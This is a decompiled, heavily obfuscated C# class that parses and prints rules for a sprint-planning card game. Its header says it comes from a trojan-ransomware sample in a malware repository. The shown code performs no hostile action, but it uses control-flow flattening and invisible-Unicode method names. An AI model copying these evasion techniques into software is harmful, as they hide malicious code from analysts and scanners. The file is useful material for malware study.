// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: Eviden, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 0FBAEA8D-82D6-42CE-BC01-F979DED3F8E4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-25002a8f723189cf80ad649d7af9ccf8c389291bb64e2eed7665e7a21823634b.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1749923933;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1635177070)) % 4U)
        {
          case 0:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 597155355 ^ 3821268;
            continue;
          case 1:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * -2071083199 ^ -2128614749;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = -1575156478;
      int aIndex;
      bool flag;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -269577262)) % 7U)
        {
          case 0:
            flag = aIndex < numArray.Length;
            num1 = -1710840109;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = -801720686;
            continue;
          case 3:
            int num3 = flag ? 1484474665 : (num3 = 1528618867);
            num1 = num3 ^ (int) num2 * -1563862713;
            continue;
          case 4:
            goto label_1;
          case 5:
            riskChances = numArray;
            num1 = (int) num2 * 1184647873 ^ 1658258269;
            continue;
          case 6:
            aIndex = 0;
            num1 = (int) num2 * 959630210 ^ 1390359346;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = -707382339;
      int num2;
      JSONNode jsonNode;
      int aIndex1;
      int count;
      List<Card> cardList;
      int aIndex2;
      Card[] array;
      bool flag1;
      bool flag2;
      bool flag3;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -911259669)) % 25U)
        {
          case 1:
            num1 = (int) num3 * -219477453 ^ -827844301;
            continue;
          case 2:
            num1 = (int) num3 * -336047458 ^ -88582207;
            continue;
          case 3:
            int num4;
            num1 = num4 = num2 < jsonNode[aIndex1].AsInt ? -1249567448 : (num4 = -1339203912);
            continue;
          case 4:
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -1915507143;
            continue;
          case 5:
            num1 = (int) num3 * 243374951 ^ -963379736;
            continue;
          case 6:
            flag3 = aIndex1 < maxImpact;
            num1 = -643483414;
            continue;
          case 7:
            num1 = -1172846974;
            continue;
          case 8:
            flag2 = aIndex2 < count;
            num1 = -1635176894;
            continue;
          case 9:
            int num5 = flag2 ? 1414477427 : (num5 = 748826872);
            num1 = num5 ^ (int) num3 * -271336558;
            continue;
          case 10:
            num1 = (int) num3 * -117926690 ^ 1198890224;
            continue;
          case 11:
            count = json.Count;
            cardList = new List<Card>();
            aIndex2 = 0;
            num1 = (int) num3 * -285821913 ^ -660737715;
            continue;
          case 12:
            jsonNode = json[aIndex2];
            num1 = (int) num3 * 447254262 ^ 383278668;
            continue;
          case 13:
            ++aIndex2;
            num1 = (int) num3 * -1535470400 ^ 306354252;
            continue;
          case 14:
            ++num2;
            num1 = (int) num3 * -602520797 ^ 1516592194;
            continue;
          case 15:
            ++aIndex1;
            num1 = (int) num3 * -1554882375 ^ 1796570624;
            continue;
          case 16:
            goto label_1;
          case 17:
            int num6 = !flag1 ? -313389561 : (num6 = -2038755603);
            num1 = num6 ^ (int) num3 * 581038425;
            continue;
          case 18:
            num2 = 0;
            num1 = (int) num3 * 1570488895 ^ 1887436866;
            continue;
          case 19:
            array = cardList.ToArray();
            num1 = (int) num3 * 99797160 ^ 595588135;
            continue;
          case 20:
            num1 = (int) num3 * 1264352482 ^ 272546630;
            continue;
          case 21:
            num1 = -122036687;
            continue;
          case 22:
            aIndex1 = 0;
            num1 = (int) num3 * 712845680 ^ -494049935;
            continue;
          case 23:
            flag1 = aIndex1 < maxImpact * 2;
            num1 = -703863205;
            continue;
          case 24:
            num1 = (int) num3 * 2141525178 ^ 109517319;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return array;
    }

    public override string ToString()
    {
      string str = Rules.\u200F‮​⁬⁭‏⁯‭‌‌⁫⁭⁪⁭⁫‭​​⁭⁮‬‍⁬‏‌⁪‌​​‪‍⁭‎‎⁪‎⁯⁬⁮⁬‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
      {
        (object) this.SprintCount,
        (object) this.MaxImpact,
        (object) this.CardsToString(),
        (object) this.InitialResources,
        (object) this.NormalPlanningCount,
        (object) this.NormalPlanningCost,
        (object) this.OverPlanningCost,
        (object) this.SprintsWonWithoutPlanning,
        (object) this.RiskChancesToString(),
        (object) this.EconomicsAffectsAll,
        (object) this.StayOnSprintMinDiff,
        (object) this.OnlyOneWinner
      });
label_1:
      int num1 = 495644185;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1850959037)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -963140577 ^ 719552021;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
label_1:
      int num1 = -629866534;
      Card[] cards;
      bool flag;
      Card card1;
      int num2;
      string str2;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -526566411)) % 17U)
        {
          case 0:
            int num4;
            num1 = num4 = index < cards.Length ? -1350982473 : (num4 = -199479971);
            continue;
          case 1:
            num1 = (int) num3 * -2018900948 ^ -633127164;
            continue;
          case 2:
            cards = this.Cards;
            num1 = (int) num3 * -501904384 ^ -972716700;
            continue;
          case 4:
            index = 0;
            num1 = (int) num3 * -765296898 ^ -332528926;
            continue;
          case 5:
            card1 = cards[index];
            num1 = -1098108249;
            continue;
          case 6:
            str1 = Rules.\u206B⁬⁮‭‮⁯‌⁭⁮‭​‏‬‮⁪‬‪⁪​‬⁮‮‎‎⁬⁮‌‫⁬‫⁪‪‍​⁯⁪‮‬⁮‭‮(str1, "\n\t");
            num1 = (int) num3 * -1479516204 ^ 459756770;
            continue;
          case 7:
            num2 = 0;
            num1 = (int) num3 * 833585093 ^ -1572580712;
            continue;
          case 8:
            goto label_1;
          case 9:
            int num5 = !flag ? -1514802402 : (num5 = -1793812087);
            num1 = num5 ^ (int) num3 * -339342521;
            continue;
          case 10:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206B‪⁫⁬‏⁪⁬‮‌⁭‮⁭‏⁮⁭⁮​‪⁭‎⁪‎​⁪⁪⁯‫‪‎⁬‌⁫‍‏‮‫‌⁫‏‌‮((object) card2) : (string) null;
            str1 = Rules.\u200D⁫‍‬‪⁮⁭‭‪‍‫⁭⁯⁯‌⁬⁭‍‏⁯‪⁪‍‪⁮⁪‪‫‍‏‪⁬‭⁮‌‌⁯⁭‌‮‮(str3, str4, " ");
            num1 = -1814152173;
            continue;
          case 11:
            ++index;
            num1 = (int) num3 * -260433470 ^ -1122194492;
            continue;
          case 12:
            flag = num2 != card1.Type;
            num1 = (int) num3 * 903310933 ^ -1540574006;
            continue;
          case 13:
            num1 = (int) num3 * -1165106059 ^ 1449548008;
            continue;
          case 14:
            num2 = card1.Type;
            num1 = (int) num3 * -143209993 ^ -1130437983;
            continue;
          case 15:
            num1 = (int) num3 * -580443637 ^ 204393182;
            continue;
          case 16:
            str2 = Rules.\u206B⁬⁮‭‮⁯‌⁭⁮‭​‏‬‮⁪‬‪⁪​‬⁮‮‎‎⁬⁮‌‫⁬‫⁪‪‍​⁯⁪‮‬⁮‭‮(str1, "\n]");
            num1 = (int) num3 * -478425181 ^ -929911284;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = -1227094299;
      string str1;
      int index;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -666092362)) % 10U)
        {
          case 0:
            num1 = (int) num2 * 2098807172 ^ 806758904;
            continue;
          case 1:
            str1 = Rules.\u200D⁫‍‬‪⁮⁭‭‪‍‫⁭⁯⁯‌⁬⁭‍‏⁯‪⁪‍‪⁮⁪‪‫‍‏‪⁬‭⁮‌‌⁯⁭‌‮‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202E‭‍‏‌‏⁪⁫⁫‏​‫‌‌⁬‫‮‫⁬‬​⁭‮​‎​‌‏‌‌⁭‎‪‎‌‪‭⁪‭‪‮()));
            ++index;
            num1 = -1458766048;
            continue;
          case 2:
            flag = index < this.RiskChances.Length;
            num1 = -640040578;
            continue;
          case 4:
            num1 = (int) num2 * -118545221 ^ 2035991999;
            continue;
          case 5:
            str1 = Rules.\u206B⁬⁮‭‮⁯‌⁭⁮‭​‏‬‮⁪‬‪⁪​‬⁮‮‎‎⁬⁮‌‫⁬‫⁪‪‍​⁯⁪‮‬⁮‭‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202E‭‍‏‌‏⁪⁫⁫‏​‫‌‌⁬‫‮‫⁬‬​⁭‮​‎​‌‏‌‌⁭‎‪‎‌‪‭⁪‭‪‮()));
            num1 = (int) num2 * -2123292113 ^ -299417624;
            continue;
          case 6:
            str2 = Rules.\u206B⁬⁮‭‮⁯‌⁭⁮‭​‏‬‮⁪‬‪⁪​‬⁮‮‎‎⁬⁮‌‫⁬‫⁪‪‍​⁯⁪‮‬⁮‭‮(str1, " ]");
            num1 = (int) num2 * -1163024287 ^ -878351432;
            continue;
          case 7:
            index = 1;
            num1 = (int) num2 * -1404023997 ^ -613140695;
            continue;
          case 8:
            int num3 = !flag ? -1659526382 : (num3 = -1120444071);
            num1 = num3 ^ (int) num2 * 345621510;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    static string \u200F‮​⁬⁭‏⁯‭‌‌⁫⁭⁪⁭⁫‭​​⁭⁮‬‍⁬‏‌⁪‌​​‪‍⁭‎‎⁪‎⁯⁬⁮⁬‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206B⁬⁮‭‮⁯‌⁭⁮‭​‏‬‮⁪‬‪⁪​‬⁮‮‎‎⁬⁮‌‫⁬‫⁪‪‍​⁯⁪‮‬⁮‭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206B‪⁫⁬‏⁪⁬‮‌⁭‮⁭‏⁮⁭⁮​‪⁭‎⁪‎​⁪⁪⁯‫‪‎⁬‌⁫‍‏‮‫‌⁫‏‌‮([In] object obj0) => obj0.ToString();

    static string \u200D⁫‍‬‪⁮⁭‭‪‍‫⁭⁯⁯‌⁬⁭‍‏⁯‪⁪‍‪⁮⁪‪‫‍‏‪⁬‭⁮‌‌⁯⁭‌‮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202E‭‍‏‌‏⁪⁫⁫‏​‫‌‌⁬‫‮‫⁬‬​⁭‮​‎​‌‏‌‌⁭‎‪‎‌‪‭⁪‭‪‮() => CultureInfo.InvariantCulture;
  }
}
